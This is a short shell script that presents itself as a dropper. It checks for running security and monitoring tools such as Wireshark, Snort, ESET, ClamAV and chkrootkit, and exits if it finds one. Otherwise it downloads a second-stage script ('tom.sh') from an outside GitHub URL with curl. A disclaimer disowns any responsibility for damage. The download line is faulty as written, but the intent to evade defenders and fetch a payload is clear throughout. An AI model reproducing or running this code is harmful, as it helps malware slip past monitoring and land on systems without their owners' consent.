#!/bin/sh 


# ==============                    
# Be a big boy, use this tool reponsibly. 
# I do not care nor am responsible for any damages done.
# ==============


#I should probably iterate over the processes with an array, but I havent figured it out yet :(
#Thinking about making the dropper sleep after every 10 seconds 


#Initializing environment 
#Fetching Tom


tom() {
    url=https://raw.githubusercontent.com/dwords/sleepingtom/main/tom.sh 
    curl -sS ${url} > tom.sh > /dev/null


}

#Attempting to detect monitors 

monid() {

    if pgrep -x "wireshark" > /dev/null;
    then 
       exit
    elif pgrep -x "snort" > /dev/null;
    then
      exit 
    elif pgrep -x "eset" > /dev/null;
    then 
       exit 
    elif pgrep -x "chkrootkit" > /dev/null;
    then 
      exit 
    elif pgrep -x "zabbix-agent" > /dev/null;
    then 
      exit 
    elif pgrep -x "ettercap-common" > /dev/null;
    then 
      exit 
    elif pgrep -x "ettercap" > /dev/null;
    then 
      exit 
    elif pgrep -x "clamscan" > /dev/null;
    then 
      exit 
    elif pgrep -x "netspot" > /dev/null;
    then 
    exit
    else 
    tom

    fi
}
monid




